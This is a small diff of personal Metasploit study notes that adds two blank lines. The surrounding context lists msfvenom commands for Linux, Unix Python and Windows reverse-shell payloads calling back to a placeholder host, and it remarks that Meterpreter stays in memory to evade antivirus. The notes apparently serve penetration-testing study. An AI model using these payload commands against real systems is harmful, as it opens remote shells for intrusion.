@@ -56,6 +56,7 @@ workspace -h -> help
 
 DB's can be manually added to. Check hosts -h and services -h commands. Also "help" > "db backend command" to see more options
 
+
 #-----MSFVENOM & MULTIHANDLERS
 Allows for the creation of payloads in different formats (dll, php, exe etc.) for different platforms (unix, windows etc.). For ex. we can create an Meterpreter payload as an exe.
 
@@ -74,6 +75,7 @@ Additional payloads:
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f elf > rev_shell.elf  -> Linux exe. (remember +x perm.)
 msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > revshell.py
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > rev_shell.exe
+
 
 #-----METERPRETER
 Basically specialized cmd & cntrl system that we can interact w/ w/ specialized cmds. It runs entirely in memory. Nothing is written to disk to avoid AV scanning. 
